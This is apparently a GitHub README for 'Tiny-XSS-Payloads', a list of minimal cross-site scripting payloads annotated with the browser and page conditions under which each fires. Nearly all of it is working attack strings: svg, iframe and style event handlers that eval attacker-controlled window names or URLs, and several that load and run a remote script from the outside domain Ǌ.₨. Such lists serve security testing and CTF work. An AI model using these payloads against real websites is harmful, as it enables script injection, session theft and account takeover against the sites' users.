# Tiny-XSS-Payloads
A collection of short XSS payloads that can be used in different contexts.

The DEMO available here: <https://terjanq.github.io/Tiny-XSS-Payloads/index.html>


## Current Payloads


```html
<!-- If you control the name, will work on Firefox in any context, will fail in chromium in DOM -->
<svg/onload=eval(name)>

<!-- If you control the URL, Safari-only -->
<iframe/onload=write(URL)>

<!-- If you control the URL -->
<svg/onload=eval(`'`+URL)>

<!-- If you control the name, but unsafe-eval not enabled -->
<svg/onload=location=name>

<!-- Just a casual script -->
<script/src=//Ǌ.₨></script>

<!-- If you control the name of the window -->
<iframe/onload=src=top.name>

<!-- If you control the URL -->
<iframe/onload=eval('`'+URL)>

<!-- If number of iframes on the page is constant -->
<iframe/onload=src=top[0].name+/\Ǌ.₨?/>

<!-- for Firefox only -->
<iframe/srcdoc="<svg><script/href=//Ǌ.₨ />">

<!-- If number of iframes on the page is random -->
<iframe/onload=src=contentWindow.name+/\Ǌ.₨?/>

<!-- If unsafe-inline is disabled in CSP and external scripts allowed -->
<iframe/srcdoc="<script/src=//Ǌ.₨></script>">

<!-- If inline styles are allowed -->
<style/onload=eval(name)>

<!-- If inline styles are allowed, Safari only -->
<style/onload=write(URL)>

<!-- If inline styles are allowed and the URL can be controlled -->
<style/onload=eval(`'`+URL)>

<!-- If inline styles are blocked -->
<style/onerror=eval(name)>

<!-- Uses external script as import, doesn't work in innerHTML unless Firefox -->
<!-- The PoC only works on https and Chrome, because Ǌ.₨ checks for Sec-Fetch-Dest header -->
<svg/onload=import(/\\Ǌ.₨/)>

<!-- Uses external script as import,  triggers if inline styles are allowed.
<!-- The PoC only works on https and Chrome, because Ǌ.₨ checks for Sec-Fetch-Dest header -->
<style/onload=import(/\\Ǌ.₨/)>

<!-- Uses external script as import -->
<!-- The PoC only works on https and Chrome, because Ǌ.₨ checks for Sec-Fetch-Dest header -->
<iframe/onload=import(/\\Ǌ.₨/)>
```
